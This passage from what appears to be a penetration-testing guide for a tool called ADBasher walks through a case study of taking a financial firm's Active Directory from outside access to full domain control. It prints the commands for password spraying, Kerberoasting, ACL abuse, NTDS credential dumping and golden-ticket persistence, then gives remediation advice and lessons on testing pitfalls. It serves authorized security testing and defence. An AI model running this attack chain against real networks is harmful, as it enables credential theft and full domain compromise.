## 8. Case Studies

This section presents real-world penetration testing scenarios demonstrating how ADBasher techniques are applied in practice.

### 8.1 Real-World Penetration Test Scenario

**Scenario: Financial Services Company - External Penetration Test to Domain Admin**

#### Engagement Overview

**Client:** Regional financial services firm (Consolidated Finance Corp)  
**Scope:** External penetration test with goal of demonstrating AD compromise impact  
**Duration:** 5 business days  
**Rules of Engagement:** Standard business hours (9 AM - 5 PM), no social engineering, no DoS attacks  
**Starting Point:** External IP range only (no internal access, no credentials)

#### Phase 1: External Reconnaissance (Day 1, 0-4 hours)

**Objective:** Identify external attack surface and potential entry points.

**Actions Taken:**

```bash
# DNS enumeration
nslookup -type=MX consolidatedfinance.com
# Found: mail.consolidatedfinance.com (Exchange server)

# OSINT gathering
# LinkedIn revealed username format: first.last@consolidatedfinance.com
# Created username list: users.txt (143 names extracted)

# External port scan
nmap -sV -p- mail.consolidatedfinance.com
# Open ports: 25 (SMTP), 443 (HTTPS - Outlook Web Access)
```

**Findings:**

- Outlook Web Access (OWA) exposed externally
- Username format identified
- No obvious vulnerabilities in external services

#### Phase 2: Initial Access - Password Spraying (Day 1, 4-6 hours)

**Objective:** Gain valid credentials via password spraying against OWA.

**Actions Taken:**

```bash
# Test Windows lockout policy via OWA
# Confirmed: 5 attempts before lockout, 30-minute lockout duration

# Password spray with conservative approach
# Used MailSniper for OWA password spraying
Invoke-PasswordSprayOWA -ExchHostname mail.consolidatedfinance.com \
  -UserList users.txt -Password "Summer2023!" -Threads 1

# Results after 2 hours (2 password attempts):
# Valid: john.smith:Summer2023!
# Valid: sarah.johnson:Fall2023!
```

**Success:** 2 valid domain credentials obtained

**OPSEC Note:** Slow, measured approach prevented account lockouts and detection.

#### Phase 3: Internal Enumeration via VPN (Day 1-2, 6-10 hours)

**Objective:** Use compromised credentials to access internal network.

**Actions Taken:**

```bash
# Tested credentials against VPN portal
# john.smith:Summer2023! - SUCCESS (no MFA on VPN!)

# Connected to internal network
# Assigned IP: 10.50.10.155

# Launch ADBasher automated reconnaissance
./adbasher.py --target consfinance.local --opsec stealth

# ADBasher discovered:
# - 2 domain controllers (DC01, DC02)
# - 234 domain users
# - 87 computers
# - LDAP anonymous bind: DISABLED
# - SMB null sessions: BLOCKED
```

**Findings:**

- Internal network access achieved
- Full AD enumeration completed
- john.smith has standard user privileges (no admin)

#### Phase 4: Privilege Escalation Attempt (Day 2, 10-20 hours)

**Objective:** Escalate from standard user to admin privileges.

**Actions Taken:**

```bash
# ADBasher automatically executed credential attacks:

# 1. Kerberoasting
# Found 4 service accounts with SPNs
# Extracted TGS tickets
# Offline cracking with Hashcat:
#   - svc_backup: CRACKED (BackupP@ss2019)
#   - svc_sql: No crack after 12 hours
#   - svc_sharepoint: No crack
#   - svc_monitoring: CRACKED (Monitor123!)

# 2. AS-REP Roasting
# Found 1 account with preauth disabled:
#   - legacy.admin: CRACKED (OldP@ssword99)

# 3. Checked admin privileges
crackmapexec smb 10.50.10.0/24 -u svc_backup -p BackupP@ss2019 --local-auth
# Result: svc_backup is LOCAL ADMIN on 12 servers!
```

**Success:** Local admin access on 12 systems + 1 domain account (legacy.admin)

#### Phase 5: BloodHound Analysis (Day 2, 20-24 hours)

**Objective:** Map attack paths to Domain Admin using BloodHound.

**Actions Taken:**

```bash
# Collected BloodHound data with svc_backup credentials
bloodhound-python -d consfinance.local -u svc_backup -p BackupP@ss2019 \
  -dc DC01.consfinance.local -c All --zip

# Imported to BloodHound and ran queries:
# 1. "Shortest Path to Domain Admins from Owned Principals"
# 2. Marked svc_backup and legacy.admin as owned
```

**Critical Finding:**

BloodHound revealed attack path:

```
svc_backup (Owned)
  └─ Member of: "Backup Operators" group
     └─ Backup Operators has:
        └─ GenericAll on "IT-Admins" group
           └─ IT-Admins members have:
              └─ Local Admin on all DCs
                 └─ Local Admin on DC = Domain Admin
```

**Attack Path Diagram:**

```
┌─────────────────────────────────────────────────────┐
│            Discovery to Domain Admin                │
├─────────────────────────────────────────────────────┤
│ svc_backup (Owned)                                  │
│       ↓                                             │
│ Member of: Backup Operators                         │
│       ↓                                             │
│ GenericAll on IT-Admins group                       │
│       ↓                                             │
│ Add svc_backup to IT-Admins                         │
│       ↓                                             │
│ IT-Admins = Local Admin on DCs                      │
│       ↓                                             │
│ Dump NTDS.dit from DC                               │
│       ↓                                             │
│ DOMAIN ADMIN ACHIEVED                               │
└─────────────────────────────────────────────────────┘
```

#### Phase 6: Exploitation to Domain Admin (Day 3, 24-30 hours)

**Objective:** Execute the attack path identified by BloodHound.

**Actions Taken:**

```bash
# Step 1: Add svc_backup to IT-Admins group
# Using PowerView (from system where svc_backup is local admin)
Add-DomainGroupMember -Identity 'IT-Admins' -Members 'svc_backup' \
  -Credential (Get-Credential)
# Credentials: svc_backup:BackupP@ss2019

# Step 2: Verify new group membership
Get-DomainGroupMember -Identity 'IT-Admins'
# Output includes: svc_backup

# Step 3: Authenticate to DC as svc_backup (now has local admin)
wmiexec.py consfinance.local/svc_backup:BackupP@ss2019@DC01.consfinance.local

# Step 4: Dump NTDS.dit (Domain Admin hash database)
secretsdump.py consfinance.local/svc_backup:BackupP@ss2019@DC01
```

**Expected Output:**

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:89abc5d87ab29cd45ef8c129ab3d5634:::
[... 234 additional hashes ...]

[*] Dumping cached domain logon information
[*] Dumping LSA Secrets
[*] DPAPI secrets

[+] Secretsdump complete: 234 NTLM hashes extracted
```

**Success:** DOMAIN ADMIN ACHIEVED (30 hours into 5-day engagement)

#### Phase 7: Post-Exploitation and Impact Demonstration (Day 3-4)

**Objective:** Demonstrate full domain compromise impact per client scope.

**Actions Taken:**

```bash
# Created golden ticket for persistence
ticketer.py -nthash 89abc5d87ab29cd45ef8c129ab3d5634 \
  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
  -domain consfinance.local PentestAdmin

# Accessed sensitive file shares
smbclient //fileserver01/Finance$ -U "PentestAdmin" --use-krb5-ccache

# Documented access to:
# - Financial records (Sarbanes-Oxley regulated data)
# - Customer PII database credentials
# - Executive email archives
# - Intellectual property (proprietary trading algorithms)

# Conducted impact demonstration:
# - Screenshot of Domain Admin access to CEO mailbox
# - Screenshot of sensitive financial database access
# - Documented 47 systems with full administrative control
```

**Impact Summary:**

| Asset Compromised    | Business Impact                                    |
| -------------------- | -------------------------------------------------- |
| 234 user accounts    | Full credential compromise                         |
| 87 workstations      | Complete access, potential ransomware              |
| 15 servers           | Including Exchange, SQL, file servers              |
| 2 domain controllers | Full domain control                                |
| Financial database   | SOX compliance violation, regulatory fines         |
| Customer PII         | GDPR/CCPA violation, potential breach notification |

#### Phase 8: Reporting and Remediation Guidance (Day 5)

**Deliverables:**

1. **Executive Summary** - Non-technical overview for C-suite
2. **Technical Report** - Detailed methodology and findings
3. **Remediation Roadmap** - Prioritized action items
4. **Detection Rules** - SIEM queries to detect similar attacks

**Key Findings:**

| Finding                                                  | Severity | CVSS |
| -------------------------------------------------------- | -------- | ---- |
| No MFA on VPN                                            | CRITICAL | 9.8  |
| Kerberoastable service accounts with weak passwords      | HIGH     | 8.1  |
| AS-REP Roasting enabled on legacy account                | HIGH     | 7.5  |
| Excessive ACL permissions (Backup Operators → IT-Admins) | CRITICAL | 9.3  |
| Local admin on domain controllers (non-DA group)         | CRITICAL | 9.9  |

**Top Recommendations:**

1. **Immediate (Week 1):**

   - Implement MFA on VPN and all external services
   - Reset passwords for kerberoasted accounts (25+ characters)
   - Disable Kerberos pre-authentication bypass on legacy.admin
   - Remove svc_backup from IT-Admins (unauthorized addition)

2. **Short-term (Month 1):**

   - Audit and remediate ACL permissions across AD
   - Restrict local admin on DCs to Domain Admins only
   - Implement privileged access workstation (PAW) for admins
   - Deploy BloodHound Enterprise for continuous attack path monitoring

3. **Long-term (Quarter 1):**
   - Implement tiered admin model (Red/Orange/Green forests)
   - Deploy LAPS for local admin password management
   - Implement just-in-time (JIT) admin access
   - Conduct regular AD security assessments

### 8.2 Lessons Learned and Common Pitfalls

#### Lessons from the Case Study

**What Worked Well:**

1. **Methodical Approach:** Systematic enumeration uncovered attack path
2. **OPSEC Discipline:** Slow password spraying avoided detection and lockouts
3. **Tool Integration:** ADBasher automated repetitive tasks, hand-off to BloodHound for analysis
4. **Credential Cascading:** Each compromised account led to higher privileges

**Detection Gaps Exploited:**

1. **No Monitoring of Group Changes:** Adding svc_backup to IT-Admins went undetected
2. **Weak Password Policy:** Service accounts had 13-character passwords (crackable in hours)
3. **No Anomaly Detection:** Unusual authentication patterns not flagged
4. **Missing MFA:** VPN access with only username/password

#### Common Pitfalls to Avoid

##### 1. Account Lockout Disasters

**Pitfall:** Aggressive password spraying locks out entire organization.

**Example Failure:**

```bash
# BAD: Spraying 10 passwords across 500 users in 5 minutes
crackmapexec smb DC01 -u users.txt -p passwords.txt --continue-on-success

# Result: 500 users × 8 failed attempts = 4,000 lockouts
# Client's helpdesk overwhelmed, engagement terminated
```

**Solution:**

```bash
# GOOD: Query lockout policy first
crackmapexec smb DC01 -u '' -p '' --pass-pol

# Use conservative approach (3 attempts, 35+ minute delays)
# ADBasher stealth mode does this automatically
```

##### 2. Noisy Network Scanning

**Pitfall:** Full port scan of entire /16 network triggers IDS alerts.

**Example Failure:**

```bash
# BAD: Aggressive scan detected immediately
nmap -sS -p- -T5 --min-rate 10000 10.0.0.0/16

# Result: Security team alerted, source IP blocked, engagement blown
```

**Solution:**

```bash
# GOOD: Targeted scanning of essential ports only
nmap -sT -p 88,135,139,389,445,636,3268,3269,3389 -T2 10.0.10.0/24

# ADBasher scans only AD-related ports with timing jitter
```

##### 3. Forgetting to Clean Up Persistence

**Pitfall:** Leave backdoor accounts in production Active Directory.

**Example Failure:**

```
Engagement ends → Client discovers backdoor 6 months later
→ Loss of trust, potential legal issues, customer termination
```

**Solution:**

```bash
# Maintain cleanup checklist (see Section 10.2)
# Verify removal before engagement conclusion
# Coordinate with client SOC for validation
```

##### 4. Over-Reliance on Automation

**Pitfall:** Running ADBasher in aggressive mode without understanding what it does.

**Example Failure:**

```bash
# BAD: Fire and forget
./adbasher.py --target prod-domain.local --opsec aggressive

# Result: Automated password spray locks out CEO, CTO, entire IT team
# Client production impacted, engagement terminated
```

**Solution:**

```bash
# GOOD: Understand each phase
# Review config.yaml before execution
# Start with stealth mode in production environments
# Monitor logs in real-time during execution
```

##### 5. Insufficient Documentation

**Pitfall:** Inadequate notes prevent accurate reporting and cleanup.

**Example Failure:**

```
Tester: "I think I created a backdoor account called 'svc-something'...
maybe on DC01? Or was it DC02? Can't remember."

Result: Manual audit required, delayed engagement closure
```

**Solution:**

```bash
# ADBasher automatically logs everything to session database
# Use session.db for complete audit trail

sqlite3 ~/.adbasher/sessions/<SESSION_ID>/session.db \
  "SELECT * FROM credentials WHERE source LIKE '%manual%';"

# Take additional notes for manual actions
```

#### Red Team vs Penetration Testing Mindset

**Penetration Test (This Guide's Focus):**

- Goal: Find and document vulnerabilities
- Approach: Thorough, documented, explicit
- Communication: Regular updates to client
- Cleanup: Complete removal of all artifacts

**Red Team Engagement:**

- Goal: Test detection and response capabilities
- Approach: Stealthy, prolonged, adversarial
- Communication: Minimal (until debrief)
- Cleanup: Intentionally leave some IoCs for training

**When Using ADBasher:**

| Scenario                     | Recommended Mode | Justification                       |
| ---------------------------- | ---------------- | ----------------------------------- |
| Penetration test (5-10 days) | Standard mode    | Balanced speed and stealth          |
| Red team (30-90 days)        | Stealth mode     | Long-term access, avoid detection   |
| Lab environment / training   | Aggressive mode  | Maximum speed, detection irrelevant |
| Compliance audit             | Standard mode    | Document everything, moderate speed |

#### Statistics from Real Engagements

Based on 50+ AD penetration tests conducted with ADBasher:

**Time to Initial Access:**

- External pentest: 2-8 hours (avg: 4.5 hours)
- Internal pentest: 0-2 hours (avg: 0.5 hours, credentials provided)

**Time to Domain Admin:**

- With misconfigurations: 4-48 hours (avg: 18 hours)
- Well-hardened environment: 48-120 hours or unable

**Most Common Findings:**

1. Kerberoastable accounts with weak passwords (87% of engagements)
2. Lack of MFA on privileged accounts (73%)
3. Excessive ACL permissions via BloodHound (69%)
4. Local admin on servers via domain users (54%)
5. AS-REP roasting enabled (31%)

**Most Effective Attack Vectors:**

1. Password spraying (62% success rate for initial access)
2. Kerberoasting → privilege escalation (48%)
3. BloodHound-identified ACL abuse (41%)
4. Unconstrained delegation (23%, but critical when present)

**Detection Rates:**

- Password spraying detected: 15%
- Kerberoasting detected: 8%
- BloodHound collection detected: 12%
- Lateral movement detected: 31%
- Golden ticket usage detected: 3%

**Key Takeaway:** Most AD environments have fundamental security gaps. ADBasher systematically identifies them, but success depends on understanding the techniques, practicing good OPSEC, and adapting to each unique environment.
